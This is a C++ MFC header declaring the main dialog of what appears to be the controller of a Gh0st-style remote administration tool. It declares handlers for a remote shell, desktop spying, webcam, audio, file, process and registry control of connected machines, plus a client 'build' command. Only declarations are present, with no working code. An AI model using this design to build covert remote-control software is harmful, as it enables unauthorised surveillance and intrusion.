
// RemoteDlg.h : 头文件
//

#pragma once
#include "afxcmn.h"
#include "TrueColorToolBar.h"
#include "IOCPServer.h"
#include "FloatWnd.h"


// CRemoteDlg 对话框
class CRemoteDlg : public CDialogEx
{
// 构造
public:
	CRemoteDlg(CWnd* pParent = NULL);	// 标准构造函数

	CTrueColorToolBar m_ToolBar;        // 工具条扩展类
	CFloatWnd* m_FloatWnd;

// 对话框数据
	enum { IDD = IDD_REMOTE_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV 支持


// 实现
protected:
	HICON m_hIcon;
	NOTIFYICONDATA nid;             //系统托盘结构
	CStatusBar  m_wndStatusBar;     //添加一个状态条
	int iCount;                     //有多少个客户端上线

	// 生成的消息映射函数
	virtual BOOL OnInitDialog();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();
	DECLARE_MESSAGE_MAP()
public:
	CListCtrl m_CList_Online;
	CListCtrl m_CList_Message;
	afx_msg void OnSize(UINT nType, int cx, int cy);
	// 初始化成员变量
	int InitList(void);
	void CRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing,ClientContext	*pContext);
	void ShowMessage(bool bOk, CString strMsg);
	void TestOnline(void);
	afx_msg void OnRclickOnline(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnOnlineCmd();
	afx_msg void OnOnlineProcess();
	afx_msg void OnOnlineWindow();
	afx_msg void OnOnlineDesktop();
	afx_msg void OnOnlineFile();
	afx_msg void OnOnlineAudio();
	afx_msg void OnOnlineVideo();
	afx_msg void OnOnlineServer();
	afx_msg void OnOnlineRegister();
	afx_msg void OnOnlineDelete();
	afx_msg void OnMainClose();
	afx_msg void OnMainAbout();
	afx_msg void OnMainSet();
	afx_msg void OnMainBuild();
	afx_msg void OnOnlineRegedit();
    afx_msg LRESULT OnOpenRegEditDialog(WPARAM, LPARAM);    //自定义消息（注册表）
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);     //自定义消息（视频管理）
	afx_msg void OnIconNotify(WPARAM wParam,LPARAM lParam); //自定义消息(系统托盘)
	afx_msg LRESULT OnOpenShellDialog(WPARAM,LPARAM);       //自定义消息(远程终端)
	afx_msg LRESULT OnOpenSystemDialog(WPARAM,LPARAM);      //自定义消息（进程管理）
	afx_msg LRESULT OnOpenManagerDialog(WPARAM,LPARAM );    //自定义消息（文件管理）
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);      //自定义消息（音频管理）
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);  //自定义消息（桌面管理）
	afx_msg	LRESULT	OnOpenServerDialog(WPARAM, LPARAM);     //自定义消息 （服务管理）
	afx_msg LRESULT OnAddToList(WPARAM, LPARAM);
	
	// 状态栏
	void CreatStatusBar(void);
	// 工具条
	void CreateToolBar(void);
	// 系统托盘
	void InitTray(PNOTIFYICONDATA nid);


	void CRemoteDlg::ListenPort(void);                        //读取配置文件ini 并调用Activate监听函数

	afx_msg void OnNotifyShow();
	afx_msg void OnNotifyClose();
	afx_msg void OnClose();
	void Activate(UINT uPort, UINT uMaxConnections);          //监听函数
	void SendSelectCommand(PBYTE pData, UINT nSize);          //向被控端发送命令

protected:
	static void CALLBACK NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);   //该函数是处理所有服务端发送过来的消息
	
};
